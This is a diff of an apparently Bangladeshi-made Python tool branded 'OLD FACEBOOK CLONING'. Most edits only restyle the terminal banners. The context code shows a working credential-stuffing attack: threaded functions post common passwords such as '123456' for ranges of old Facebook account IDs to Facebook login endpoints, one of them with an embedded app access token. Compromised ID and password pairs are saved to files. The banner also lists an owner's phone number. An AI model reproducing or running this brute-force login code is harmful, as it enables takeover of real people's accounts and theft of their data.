@@ -25,17 +25,20 @@ cps = []
 loop = 0
 
 def clear():
-    os.system('clear' if os.name == 'posix' else 'cls')
+    try:
+        os.system('clear' if os.name == 'posix' else 'cls')
+    except:
+        print("\n" * 50)
 
 def login():
     clear()
-    print(f"{YELLOW}╔══════════════════════════════════════════════════════════╗")
-    print(f"║                                                          ║")
-    print(f"║                  {RED}{BOLD}OLD FACEBOOK CLONING{RESET}{YELLOW}                    ║")
-    print(f"║               {CYAN}Raja vau Youtube Chanel{RESET}{YELLOW}                    ║")
-    print(f"║              {WHITE}don't forget the subscribe{RESET}{YELLOW}                  ║")
-    print(f"║                                                          ║")
-    print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
+    print(f"{YELLOW}╔══════════════════════════════════════════════════╗")
+    print(f"│                                                  │")
+    print(f"│             {RED}{BOLD}OLD FACEBOOK CLONING{RESET}{YELLOW}                 │")
+    print(f"│            {CYAN}Raja vau Youtube Chanel{RESET}{YELLOW}               │")
+    print(f"│           {WHITE}don't forget the subscribe{RESET}{YELLOW}             │")
+    print(f"│                                                  │")
+    print(f"╚══════════════════════════════════════════════════╝{RESET}\n")
     
     user_input = input(f"{GREEN}{BOLD}Username ➔ {RESET}")
     
@@ -62,26 +65,26 @@ def login():
 
 def banner():
     clear()
-    print(f"{YELLOW}╔══════════════════════════════════════════════════════════╗")
-    print(f"│                                                          │")
-    print(f"│    /$$   /$$  /$$$$$$  /$$      /$$  /$$$$$$  /$$          │")
-    print(f"│   | $$  /$$/ /$$__  $$ | $$$    /$$$ /$$__  $$ | $$          │")
-    print(f"│   | $$ /$$/ | $$  \\ $$ | $$$$  /$$$$| $$  \\ $$ | $$          │")
-    print(f"│   | $$$$$/  | $$$$$$$$ | $$ $$/$$ $$| $$$$$$$$ | $$          │")
-    print(f"│   | $$  $$  | $$  __ $$ | $$  __ $$ | $$  __ $$ | $$          │")
-    print(f"│   | $$ \\  $$ | $$  | $$ | $$\\  $ | $$| $$  \\ $$ | $$          │")
-    print(f"│   | $$  \\  $$| $$  | $$ | $$ \\/  | $$| $$  \\ $$ | $$$$$$$$    │")
-    print(f"│   |__/   \\_/ |__/  |__/ |__/     |__/|__/  |__/ |________/     │")
-    print(f"│                                           V6.0 (EXPERT PRO)│")
-    print(f"│───────────────────── {WHITE}[MADE BY KAMAL]{YELLOW} ─────────────────────│")
-    print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
+    print(f"{YELLOW}╔══════════════════════════════════════════════════╗")
+    print(f"│                                                  │")
+    print(f"│   /$$   /$$  /$$$$$$  /$$      /$$  /$$$$$$  /$$ │")
+    print(f"│  | $$  /$$/ /$$__  $$ | $$$    /$$$ /$$__  $$ | $$ │")
+    print(f"│  | $$ /$$/ | $$  \\ $$ | $$$$  /$$$$| $$  \\ $$ | $$ │")
+    print(f"│  | $$$$$/  | $$$$$$$$ | $$ $$/$$ $$| $$$$$$$$ | $$ │")
+    print(f"│  | $$  $$  | $$  __ $$ | $$  __ $$ | $$  __ $$ | $$ │")
+    print(f"│  | $$ \\  $$ | $$  | $$ | $$\\  $ | $$| $$  \\ $$ | $$ │")
+    print(f"│  | $$  \\  $$| $$  | $$ | $$ \\/  | $$| $$  \\ $$ | $$$$ │")
+    print(f"│  |__/   \\_/ |__/  |__/ |__/     |__/|__/  |__/ |____/ │")
+    print(f"│                                  V6.0 (EXPERT PRO)│")
+    print(f"│─────────────── {WHITE}[MADE BY KAMAL]{YELLOW} ───────────────────│")
+    print(f"╚══════════════════════════════════════════════════╝{RESET}\n")
     
-    print(f"{CYAN}┌──────────────────────────────────────────────────────────┐")
-    print(f"│  ✨ Premium tools                                        │")
-    print(f"│  👤 Owner  : Kamal Raja                                  │")
-    print(f"│  🛡️ Admin  : Raja Vau                                    │")
-    print(f"│  📞 Number : +8801736602421                              │")
-    print(f"└──────────────────────────────────────────────────────────┘{RESET}\n")
+    print(f"{CYAN}┌──────────────────────────────────────────────────┐")
+    print(f"│  ✨ Premium tools                                │")
+    print(f"│  👤 Owner  : Kamal Raja                          │")
+    print(f"│  🛡️ Admin  : Raja Vau                            │")
+    print(f"│  📞 Number : +8801736602421                      │")
+    print(f"└──────────────────────────────────────────────────┘{RESET}\n")
 
 def update_script():
     print(f"\n{CYAN}[•] Checking latest version...{RESET}")
@@ -125,11 +128,11 @@ def window1():
 
 def old_clone():
     banner()
-    print(f"       {GREEN}[1]{WHITE} 2006 SERIES (7 DIGIT) ➔ [INSTANT EXPERT CRACK]")
-    print(f"       {GREEN}[2]{WHITE} 2007-2008 SERIES (8 DIGIT) ➔ [INSTANT EXPERT CRACK]")
+    print(f"       {GREEN}[1]{WHITE} 2006 SERIES (7 DIGIT) ➔ [INSTANT EXPERT]")
+    print(f"       {GREEN}[2]{WHITE} 2007-2008 SERIES (8 DIGIT) ➔ [INSTANT]")
     print(f"       {GREEN}[3]{WHITE} 2009-2010 SERIES (OLD)")
     print(f"       {GREEN}[4]{WHITE} 100003/4 SERIES (2011-2012) (OLD)")
-    print("=" * 45)
+    print("=" * 50)
     _input = input(f"       {YELLOW}CHOICE ➔ {RESET}").strip()
     if _input == '1':
         instant_2006()
@@ -153,10 +156,10 @@ def instant_2006():
     global loop
     loop = 0
     banner()
-    print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
-    print(f"║     {YELLOW}{BOLD}[•] 2006 EXPERT AUTO-CRACKING STARTED [•]{RESET}{CYAN}      ║")
-    print(f"║       {WHITE}💡 TIP: USE AIRPLANE MODE IF SPEED DROPS{RESET}{CYAN}           ║")
-    print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
+    print(f"{CYAN}╔══════════════════════════════════════════════════╗")
+    print(f"║     {YELLOW}{BOLD}[•] 2006 EXPERT AUTO-CRACKING [•]{RESET}{CYAN}          ║")
+    print(f"║     {WHITE}💡 TIP: USE AIRPLANE MODE IF SLOW{RESET}{CYAN}             ║")
+    print(f"╚══════════════════════════════════════════════════╝{RESET}\n")
     
     with tred(max_workers=50) as pool:
         for uid in user:
@@ -172,10 +175,10 @@ def instant_2007_2008_8digit():
     global loop
     loop = 0
     banner()
-    print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
-    print(f"║   {YELLOW}{BOLD}[•] 2007-2008 EXPERT INSTANT CRACKING [•]{RESET}{CYAN}    ║")
-    print(f"║       {WHITE}💡 TIP: USE AIRPLANE MODE IF SPEED DROPS{RESET}{CYAN}           ║")
-    print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
+    print(f"{CYAN}╔══════════════════════════════════════════════════╗")
+    print(f"║   {YELLOW}{BOLD}[•] 2007-2008 INSTANT CRACKING [•]{RESET}{CYAN}      ║")
+    print(f"║     {WHITE}💡 TIP: USE AIRPLANE MODE IF SLOW{RESET}{CYAN}             ║")
+    print(f"╚══════════════════════════════════════════════════╝{RESET}\n")
     
     with tred(max_workers=50) as pool:
         for uid in user:
@@ -201,10 +204,10 @@ def old_Tow():
     loop = 0
     with tred(max_workers=50) as pool:
         banner()
-        print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
-        print(f"║          {YELLOW}{BOLD}[•] HIGH-SPEED CLONING ACTIVE [•]{RESET}{CYAN}               ║")
-        print(f"║       {WHITE}💡 TIP: USE AIRPLANE MODE IF SPEED DROPS{RESET}{CYAN}           ║")
-        print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
+        print(f"{CYAN}╔══════════════════════════════════════════════════╗")
+        print(f"║          {YELLOW}{BOLD}[•] HIGH-SPEED CLONING [•]{RESET}{CYAN}             ║")
+        print(f"║     {WHITE}💡 TIP: USE AIRPLANE MODE IF SLOW{RESET}{CYAN}             ║")
+        print(f"╚══════════════════════════════════════════════════╝{RESET}\n")
         for uid in user:
             if meth == 'A':
                 pool.submit(login_1, uid)
@@ -229,10 +232,10 @@ def old_Tree():
     loop = 0
     with tred(max_workers=50) as pool:
         banner()
-        print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
-        print(f"║          {YELLOW}{BOLD}[•] HIGH-SPEED CLONING ACTIVE [•]{RESET}{CYAN}               ║")
-        print(f"║       {WHITE}💡 TIP: USE AIRPLANE MODE IF SPEED DROPS{RESET}{CYAN}           ║")
-        print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
+        print(f"{CYAN}╔══════════════════════════════════════════════════╗")
+        print(f"║          {YELLOW}{BOLD}[•] HIGH-SPEED CLONING [•]{RESET}{CYAN}             ║")
+        print(f"║     {WHITE}💡 TIP: USE AIRPLANE MODE IF SLOW{RESET}{CYAN}             ║")
+        print(f"╚══════════════════════════════════════════════════╝{RESET}\n")
         for uid in user:
             if meth == 'A':
                 pool.submit(login_1, uid)
@@ -245,7 +248,7 @@ def login_engine(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r{CYAN}[KAMAL-EXPERT] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}) {RED}[CP] ({len(cps)}){RESET}")
+        sys.stdout.write(f"\r\r{CYAN}[KAMAL] {YELLOW}•{CYAN} Proc: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}) {RED}[CP] ({len(cps)}){RESET}")
         sys.stdout.flush()
         
         passwords = ('123456', 'password', '12345', '12345678', 'qwerty', '123123', 'iloveyou', 'secret', '1234567', 'admin', '112233', '000000', '123456890', '1234560', '1234', 'welcome')
@@ -284,27 +287,27 @@ def login_engine(uid):
             res = session.post(endpoint, data=data, headers=headers, allow_redirects=False).json()
             
             if 'session_key' in res or 'access_token' in res:
-                ok_msg = f"\n{GREEN}╔══════════════════════════════════════════════════════════╗\n" \
-                         f"║                   {BOLD}🎉 SUCCESSFUL HIT! 🎉{RESET}{GREEN}                 ║\n" \
-                         f"╠══════════════════════════════════════════════════════════╣\n" \
-                         f"║  🔗 Link     : https://www.facebook.com/{uid}       \n" \
-                         f"║  🔢 UID      : {uid:<43} ║\n" \
-                         f"║  🔑 Password : {pw:<43} ║\n" \
-                         f"║  📅 Era      : {creationyear(uid):<43} ║\n" \
-                         f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
+                ok_msg = f"\n{GREEN}╔══════════════════════════════════════════════════╗\n" \
+                         f"║              {BOLD}🎉 SUCCESSFUL HIT! 🎉{RESET}{GREEN}             ║\n" \
+                         f"╠══════════════════════════════════════════════════╣\n" \
+                         f"║  🔗 Link     : https://www.facebook.com/{uid}\n" \
+                         f"║  🔢 UID      : {uid:<35} ║\n" \
+                         f"║  🔑 Password : {pw:<35} ║\n" \
+                         f"║  📅 Era      : {creationyear(uid):<35} ║\n" \
+                         f"╚══════════════════════════════════════════════════╝{RESET}\n"
                 print(ok_msg)
                 open('/sdcard/KAMAL-OLD-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nEra: {creationyear(uid)}\n-----------------------------------\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                cp_msg = f"\n{YELLOW}╔══════════════════════════════════════════════════════════╗\n" \
-                         f"║                   {BOLD}⚠️ CHECKPOINT HIT! ⚠️{RESET}{YELLOW}                 ║\n" \
-                         f"╠══════════════════════════════════════════════════════════╣\n" \
-                         f"║  🔗 Link     : https://www.facebook.com/{uid}       \n" \
-                         f"║  🔢 UID      : {uid:<43} ║\n" \
-                         f"║  🔑 Password : {pw:<43} ║\n" \
-                         f"║  📅 Era      : {creationyear(uid):<43} ║\n" \
-                         f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
+                cp_msg = f"\n{YELLOW}╔══════════════════════════════════════════════════╗\n" \
+                         f"║              {BOLD}⚠️ CHECKPOINT HIT! ⚠️{RESET}{YELLOW}             ║\n" \
+                         f"╠══════════════════════════════════════════════════╣\n" \
+                         f"║  🔗 Link     : https://www.facebook.com/{uid}\n" \
+                         f"║  🔢 UID      : {uid:<35} ║\n" \
+                         f"║  🔑 Password : {pw:<35} ║\n" \
+                         f"║  📅 Era      : {creationyear(uid):<35} ║\n" \
+                         f"╚══════════════════════════════════════════════════╝{RESET}\n"
                 print(cp_msg)
                 open('/sdcard/KAMAL-OLD-CP.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nEra: {creationyear(uid)}\n-----------------------------------\n")
                 cps.append(uid)
@@ -318,7 +321,7 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r{CYAN}[KAMAL-M1] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}){RESET}")
+        sys.stdout.write(f"\r\r{CYAN}[KAMAL-M1] {YELLOW}•{CYAN} Proc: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}){RESET}")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
@@ -352,27 +355,27 @@ def login_1(uid):
             }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res or 'access_token' in res:
-                ok_msg = f"\n{GREEN}╔══════════════════════════════════════════════════════════╗\n" \
-                         f"║                   {BOLD}🎉 SUCCESSFUL HIT! 🎉{RESET}{GREEN}                 ║\n" \
-                         f"╠══════════════════════════════════════════════════════════╣\n" \
-                         f"║  🔗 Link     : https://www.facebook.com/{uid}       \n" \
-                         f"║  🔢 UID      : {uid:<43} ║\n" \
-                         f"║  🔑 Password : {pw:<43} ║\n" \
-                         f"║  📅 Created  : {creationyear(uid):<43} ║\n" \
-                         f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
+                ok_msg = f"\n{GREEN}╔══════════════════════════════════════════════════╗\n" \
+                         f"║              {BOLD}🎉 SUCCESSFUL HIT! 🎉{RESET}{GREEN}             ║\n" \
+                         f"╠══════════════════════════════════════════════════╣\n" \
+                         f"║  🔗 Link     : https://www.facebook.com/{uid}\n" \
+                         f"║  🔢 UID      : {uid:<35} ║\n" \
+                         f"║  🔑 Password : {pw:<35} ║\n" \
+                         f"║  📅 Created  : {creationyear(uid):<35} ║\n" \
+                         f"╚══════════════════════════════════════════════════╝{RESET}\n"
                 print(ok_msg)
                 open('/sdcard/KAMAL-OLD-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nYear: {creationyear(uid)}\n-----------------------------------\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                ok_msg = f"\n{GREEN}╔══════════════════════════════════════════════════════════╗\n" \
-                         f"║                   {BOLD}🎉 SUCCESSFUL HIT! 🎉{RESET}{GREEN}                 ║\n" \
-                         f"╠══════════════════════════════════════════════════════════╣\n" \
-                         f"║  🔗 Link     : https://www.facebook.com/{uid}       \n" \
-                         f"║  🔢 UID      : {uid:<43} ║\n" \
-                         f"║  🔑 Password : {pw:<43} ║\n" \
-                         f"║  📅 Created  : {creationyear(uid):<43} ║\n" \
-                         f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
+                ok_msg = f"\n{GREEN}╔══════════════════════════════════════════════════╗\n" \
+                         f"║              {BOLD}🎉 SUCCESSFUL HIT! 🎉{RESET}{GREEN}             ║\n" \
+                         f"╠══════════════════════════════════════════════════╣\n" \
+                         f"║  🔗 Link     : https://www.facebook.com/{uid}\n" \
+                         f"║  🔢 UID      : {uid:<35} ║\n" \
+                         f"║  🔑 Password : {pw:<35} ║\n" \
+                         f"║  📅 Created  : {creationyear(uid):<35} ║\n" \
+                         f"╚══════════════════════════════════════════════════╝{RESET}\n"
                 print(ok_msg)
                 open('/sdcard/KAMAL-OLD-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nYear: {creationyear(uid)}\n-----------------------------------\n")
                 oks.append(uid)
@@ -384,7 +387,7 @@ def login_1(uid):
 def login_2(uid):
     global loop
     try:
-        sys.stdout.write(f"\r\r{CYAN}[KAMAL-M2] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}){RESET}")
+        sys.stdout.write(f"\r\r{CYAN}[KAMAL-M2] {YELLOW}•{CYAN} Proc: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}){RESET}")
         sys.stdout.flush()
         for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
             with requests.Session() as session:
@@ -396,14 +399,14 @@ def login_2(uid):
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&method=GET&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
-                    ok_msg = f"\n{GREEN}╔══════════════════════════════════════════════════════════╗\n" \
-                             f"║                   {BOLD}🎉 SUCCESSFUL HIT! 🎉{RESET}{GREEN}                 ║\n" \
-                             f"╠══════════════════════════════════════════════════════════╣\n" \
-                             f"║  🔗 Link     : https://www.facebook.com/{uid}       \n" \
-                             f"║  🔢 UID      : {uid:<43} ║\n" \
-                             f"║  🔑 Password : {pw:<43} ║\n" \
-                             f"║  📅 Created  : {creationyear(uid):<43} ║\n" \
-                             f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
+                    ok_msg = f"\n{GREEN}╔══════════════════════════════════════════════════╗\n" \
+                             f"║              {BOLD}🎉 SUCCESSFUL HIT! 🎉{RESET}{GREEN}             ║\n" \
+                             f"╠══════════════════════════════════════════════════╣\n" \
+                             f"║  🔗 Link     : https://www.facebook.com/{uid}\n" \
+                             f"║  🔢 UID      : {uid:<35} ║\n" \
+                             f"║  🔑 Password : {pw:<35} ║\n" \
+                             f"║  📅 Created  : {creationyear(uid):<35} ║\n" \
+                             f"╚══════════════════════════════════════════════════╝{RESET}\n"
                     print(ok_msg)
                     open('/sdcard/KAMAL-OLD-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nYear: {creationyear(uid)}\n-----------------------------------\n")
                     oks.append(uid)
@@ -416,17 +419,17 @@ def main_menu():
     login()
     while True:
         banner()
-        print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
-        print(f"║                      {YELLOW}{BOLD}MAIN MENU{RESET}{CYAN}                           ║")
-        print(f"╠══════════════════════════════════════════════════════════╣")
-        print(f"║                                                          ║")
-        print(f"║   {GREEN}{BOLD}[1]{RESET} ➔ {WHITE}{BOLD}FACEBOOK CLONE (OLD SERIES){RESET}          {CYAN}║")
-        print(f"║                                                          ║")
-        print(f"║   {GREEN}{BOLD}[2]{RESET} ➔ {WHITE}{BOLD}UPDATE TOOL{RESET}                           {CYAN}║")
-        print(f"║                                                          ║")
-        print(f"║   {RED}{BOLD}[3]{RESET} ➔ {WHITE}{BOLD}EXIT SYSTEM{RESET}                           {CYAN}║")
-        print(f"║                                                          ║")
-        print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
+        print(f"{CYAN}╔══════════════════════════════════════════════════╗")
+        print(f"║                   {YELLOW}{BOLD}MAIN MENU{RESET}{CYAN}                      ║")
+        print(f"╠══════════════════════════════════════════════════╣")
+        print(f"║                                                  ║")
+        print(f"║   {GREEN}{BOLD}[1]{RESET} ➔ {WHITE}{BOLD}FACEBOOK CLONE (OLD SERIES){RESET}      {CYAN}║")
+        print(f"║                                                  ║")
+        print(f"║   {GREEN}{BOLD}[2]{RESET} ➔ {WHITE}{BOLD}UPDATE TOOL{RESET}                       {CYAN}║")
+        print(f"║                                                  ║")
+        print(f"║   {RED}{BOLD}[3]{RESET} ➔ {WHITE}{BOLD}EXIT SYSTEM{RESET}                       {CYAN}║")
+        print(f"║                                                  ║")
+        print(f"╚══════════════════════════════════════════════════╝{RESET}\n")
 
         ch = input(f"{YELLOW}{BOLD}CHOOSE [1/2/3] ──> {RESET}").strip()
 
